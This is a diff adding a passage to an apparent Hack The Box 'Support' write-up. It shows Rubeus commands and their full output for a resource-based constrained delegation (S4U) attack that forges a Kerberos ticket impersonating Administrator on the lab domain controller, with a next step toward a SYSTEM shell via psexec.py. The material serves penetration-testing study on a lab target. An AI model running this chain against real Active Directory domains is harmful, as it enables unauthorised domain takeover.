@@ -1362,6 +1362,153 @@ With the DC configured to trust `FAKE-COMP01$`, Rubeus uses that account's Kerb
     - **Purpose:** Also prints the base64 ticket, which is exported to the attack host for use with Impacket.
 
 **Result:**
+
+```shell
+
+*Evil-WinRM* PS C:\Users\support\Documents> .\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.0
+
+
+[*] Action: Calculate Password Hash(es)
+
+[*] Input password             : Password123
+[*] Input username             : FAKE-COMP01$
+[*] Input domain               : support.htb
+[*] Salt                       : SUPPORT.HTBhostfake-comp01.support.htb
+[*]       rc4_hmac             : 58A478135A93AC3BF058A5EA0E8FDB71
+[*]       aes128_cts_hmac_sha1 : 06C1EABAD3A21C24DF384247BC85C540
+[*]       aes256_cts_hmac_sha1 : FF7BA224B544AA97002B2BEE94EADBA7855EF81A1E05B7EB33D4BCD55807FF53
+[*]       des_cbc_md5          : 5B045E854358687C
+
+*Evil-WinRM* PS C:\Users\support\Documents> .\Rubeus.exe s4u /user:FAKE-COMP01$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.0
+
+[*] Action: S4U
+
+[*] Using rc4_hmac hash: 58A478135A93AC3BF058A5EA0E8FDB71
+[*] Building AS-REQ (w/ preauth) for: 'support.htb\FAKE-COMP01$'
+[*] Using domain controller: ::1:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      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
+
+
+[*] Action: S4U
+
+[*] Building S4U2self request for: 'FAKE-COMP01$@SUPPORT.HTB'
+[*] Using domain controller: dc.support.htb (::1)
+[*] Sending S4U2self request to ::1:88
+[+] S4U2self success!
+[*] Got a TGS for 'Administrator' to 'FAKE-COMP01$@SUPPORT.HTB'
+[*] base64(ticket.kirbi):
+
+      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
+      MA4bDEZBS0UtQ09NUDAxJA==
+
+[*] Impersonating user 'Administrator' to target SPN 'cifs/dc.support.htb'
+[*] Building S4U2proxy request for service: 'cifs/dc.support.htb'
+[*] Using domain controller: dc.support.htb (::1)
+[*] Sending S4U2proxy request to domain controller ::1:88
+[+] S4U2proxy success!
+[*] base64(ticket.kirbi) for SPN 'cifs/dc.support.htb':
+
+      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
+      MBYbBGNpZnMbDmRjLnN1cHBvcnQuaHRi
+[+] Ticket successfully imported!
+```
+
+**Key finding:** a valid Kerberos service ticket impersonating `Administrator` for `cifs/dc.support.htb` is obtained — usable to authenticate to the DC as a Domain Admin.
+
+**Next:** Convert the base64 `.kirbi` ticket to Impacket's `.ccache` format and open a SYSTEM shell on the DC with `psexec.py`.
 <div align="center">
 <br>
 <br>
